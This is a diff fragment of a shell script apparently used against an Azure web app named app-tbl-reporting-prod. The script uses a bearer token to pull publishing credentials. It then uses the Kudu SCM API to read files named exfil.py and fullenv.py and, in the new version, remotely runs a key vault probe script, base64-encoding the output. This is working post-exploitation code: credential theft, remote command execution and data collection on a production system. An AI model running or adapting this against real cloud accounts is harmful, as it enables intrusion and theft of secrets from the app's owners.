@@ -11,9 +11,9 @@ PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RA" -H 'Content-L
 PU=$(echo "$PC"|jq -r '.properties.publishingUserName // empty'); PP=$(echo "$PC"|jq -r '.properties.publishingPassword // empty')
 say "PUB=$([[ -n "$PU" && -n "$PP" ]] && echo OK || echo FAIL)"; [[ -n "$PU" && -n "$PP" ]] || exit 0
 SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
-for p in 'site/wwwroot/check_kv.py' 'site/wwwroot/exfil.py' 'site/wwwroot/fullenv.py' 'site/wwwroot/msi_probe.py' 'site/wwwroot/msi_probe.txt' 'site/wwwroot/results.json' 'results.json' 'site/wwwroot/app.py'; do
-  code=$(curl -sS --max-time 20 -o /tmp/f -w '%{http_code}' -u "$PU:$PP" "$SCM/api/vfs/$p" || echo 000)
-  say "F_${p//\//_}_HTTP=$code"
-  [[ "$code" == "200" ]] && say "F_${p//\//_}_B64=$(base64 -w0 </tmp/f)"
-done
+V=$(curl -sS --max-time 20 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/check_kv.py")
+say "CHECK_KV_PRESENT=$([[ -n "$V" ]] && echo yes || echo no)"
+BODY=$(jq -nc '{command:"python3 /home/site/wwwroot/check_kv.py",dir:"/home/site/wwwroot"}')
+OUT=$(curl -sS --max-time 60 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$BODY")
+say "CHECK_OUT_B64=$(printf '%s' "$OUT" | base64 -w0)"
 say DONE
